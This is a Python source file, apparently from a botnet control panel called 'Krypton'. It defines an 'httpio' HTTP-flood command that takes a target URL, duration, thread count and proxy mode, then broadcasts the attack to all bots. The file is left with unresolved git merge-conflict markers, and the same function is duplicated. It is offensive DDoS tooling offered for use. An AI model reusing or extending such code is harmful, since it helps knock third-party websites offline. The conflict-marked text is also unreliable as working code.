<<<<<<< HEAD
<<<<<<<< HEAD:src/Commands/Methods_L7/httpio.py
import time
from colorama import Fore

def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
    
    maxThreads = 100 # Threads Limit (recommended 100 or 130)

    if len(args) == 5:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        attackType = args[4]
        if validate_time(secs):
            if threadx <= maxThreads and threadx > 0:
                if attackType == 'PROXY' or attackType == 'NORMAL' or attackType == 'proxy' or attackType == 'normal':
                    time.sleep(1)
                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
                    broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack type (PROXY, NORMAL)\n')
            else:
              send(client, Fore.RED + '\nInvalid threads (1-100 threads)\n')  
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpio [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')
========
# deleted
>>>>>>>> c8a0fc504e65e8787c17a7240ce9b1a88b341abc:src/Commands/Methods_L7/iostresser.py
=======
import time
from colorama import Fore

def httpio(args, validate_time, send, client, ansi_clear, broadcast, data):
    
    maxThreads = 100 # Threads Limit (recommended 100 or 130)

    if len(args) == 5:
        url = args[1]
        secs = args[2]
        threadx = int(args[3])
        attackType = args[4]
        if validate_time(secs):
            if threadx <= maxThreads and threadx > 0:
                if attackType == 'PROXY' or attackType == 'NORMAL' or attackType == 'proxy' or attackType == 'normal':
                    time.sleep(1)
                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
                    broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack type (PROXY, NORMAL)\n')
            else:
              send(client, Fore.RED + '\nInvalid threads (1-100 threads)\n')  
        else:
            send(client, Fore.RED + '\nInvalid attack duration (1-1200 seconds)\n')
    else:
        send(client, f'\nUsage: {Fore.LIGHTBLACK_EX}.httpio [URL] [TIME] [THREADS] [PROXY, NORMAL]\n')
>>>>>>> c8a0fc504e65e8787c17a7240ce9b1a88b341abc
